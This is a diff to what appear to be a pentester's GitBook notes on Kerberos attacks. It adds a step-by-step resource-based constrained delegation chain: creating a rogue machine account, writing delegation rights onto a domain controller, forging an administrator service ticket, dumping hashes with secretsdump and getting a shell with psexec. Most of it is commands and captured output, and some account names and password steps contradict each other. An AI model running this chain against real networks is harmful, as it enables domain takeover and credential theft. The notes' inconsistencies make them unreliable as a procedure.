@@ -19,6 +19,16 @@ https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 <figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
+{% hint style="danger" %}
+When dealing with users that have no password, do like
+
+```
+'dom.com/myuser:' -k
+```
+
+and then we will have a prompt to input an empty password. DO IT LIKE THIS EVEN THOUGH WE DO NOT HAVE A KERBEROS TICKET. DO NOT USE A TICKET OR .CCACHE TO GET ONE WITH EMPTY PASSWORD, AND DO NOT INCLUDE -no-pass argument, IT WILL FAIL.
+{% endhint %}
+
 ## Benefits
 
 {% code overflow="wrap" %}
@@ -524,19 +534,78 @@ https://www.ired.team/offensive-security-experiments/active-directory-kerberos-a
 https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks#info
 https://github.com/tothi/rbcd-attack
 
-# Create a computer X (for example, rbcd$)
-addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host 'DC_HOST' 'domain'/'user':'password'
-# We can verify that this machine account was added to the domain
-Get-ADComputer rbcd
-# Add delegation write on our target from X (rbcd$)
-rbcd.py -delegate-from 'rbcd$' -delegate-to 'targetComputer$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'password'
-# We can confirm that this was successful
-Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity | select -expand msds-allowedtoactonbehalfofotheridentity
-# s4u2self + S4u2proxy to get administration permissions on the target computer
-# cifs can be anything (maybe active SPN???), dc has to be the DC or the machine name and Administrator is any domain admin we want to impersonate, FAKE01 is the fake machine created earlier
-getST.py -spn cifs/dc.domain.com -impersonate Administrator -dc-ip 10.10.10.10 domain.com/'rbcd$':'rbcdpass'
-# After adding the file path to the KRB5CCNAME variable the ticket is usable for Kerberos clients:
-export KRB5CCNAME=Administrator.ccache                     
+############ PREREQUISITES
+- Domain account with write access to the target computer
+- Permission to create new computer accounts (this is usually default, see if MachineAccountQuota > 0)
+nxc ldap TARGET_COMPUTER -u user -p password -M maq
+ldapsearch -x -H ldap://TARGET_IP -D 'user@dom.com' -w '' -b "DC=DOM,DC=COM" | grep -i "ms-DS-MachineAccountQuota"
+Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local | Select ms-DS-MachineAccountQuota
+- DC to be running at least Windows 2012
+- The target computer WS01 object must not have the attribute msds-allowedtoactonbehalfofotheridentity set:
+Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
+ldapsearch -x -H ldap://TARGET_IP -D 'user@dom.com' -w '' -b "DC=DOM,DC=COM" | grep -i msds-allowedtoactonbehalfofotheridentity
+- LDAP (389/tcp) and SAMR (445/tcp) (or LDAPS (636/tcp)) Kerberos (88/tcp) access to the DC.
+
+# ADD COMPUTER ACCOUNT (PS)
+custom_prompt> . .\Powermad.ps1
+custom_prompt> echo $error
+custom_prompt> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+[+] Machine account attackersystem added
+custom_prompt> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+custom_prompt> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)custom_prompt> custom_prompt> 
+custom_prompt> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+
+
+# CHECK MAQ
+nxc ldap $DC_IP -u $USER -p $PASS -M maq
+...
+MAQ         172.16.2.6      389    DC02             [*] Getting the MachineAccountQuota
+MAQ         172.16.2.6      389    DC02             MachineAccountQuota: 10
+
+# FIRST, WE ADD A FAKE COMPUTER
+└─$ addcomputer.py -computer-name 'attackersystem$' -computer-pass 'Summer2018!' 'dom.com'/'joe' -no-pass                                                                                                                                                                      
+[*] Successfully added machine account attackersystem$ with password Summer2018!.    
+
+# NOW WE PERFORM RBCD TO ASSIGN DELEGATION RIGHTS ON attackersystem$ over DC02$
+# IMPORTANT: USER HAS DONOTREQPWD SO 'dom.com/user:' -k and then input empty password, do not use a ticket or .ccache since we can provide empty password this way
+└─$ rbcd.py -delegate-from 'attackersystem2$' -delegate-to 'DC02$' -action 'write' 'dom.com/user:' -k -dc-ip $DC_IP                                                                         
+[*] No credentials supplied, supply password                                                                                                                                 
+Password:                                                                                                                                                                    
+[-] CCache file is not found. Skipping...                                                                                                                                    
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty                                                                                                              
+[*] Delegation rights modified successfully!                                                                                                                                 
+[*] rbcd$ can now impersonate users on DC02$ via S4U2Proxy                                                                                                                   
+[*] Accounts allowed to act on behalf of other identity:  
+[*]     attackersystem$   (S-1-5-21-1416445593-394318334-2645530166-12602)  
+
+
+# Now provide empty password the same way again when we get the ticket:
+└─$ getST.py -spn 'cifs/dc02.dom.com' -impersonate 'administrator' 'dom.com/attackersystem$:Summer2018!'
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_dc02.dev.admin.offshore.com@DEV.ADMIN.OFFSHORE.COM.ccache
+
+export KRB5CCNAME='administrator@cifs_dc02.XXX.ccache'
+
+klist
+Ticket cache: FILE:administrator@cifs_dc02.XXX.ccache
+Default principal: administrator@dom.com
+
+Valid starting       Expires              Service principal
+06/17/2025 17:24:49  06/18/2025 03:24:49  cifs/dc02.dom.com@DOM.COM
+        renew until 06/18/2025 17:24:49
+
+# We can dump hashes with that ticket
+secretsdump.py dom.com/administrator@dc02.dom.com -k -no-pass
+# A SHORTER OPTION IS
+secretsdump.py @dc.domain.com -k -no-pass
+
+                                  
 # Now we can authenticate as Administrator using that Kerberos ticket with no password. NOTE: dc.domain.com is needed after @
 psexec.py domain.com/Administrator@dc.domain.com -k -no-pass
 impacket-psexec -k -no-pass dc.domain.com -dc-ip $DC_IP 
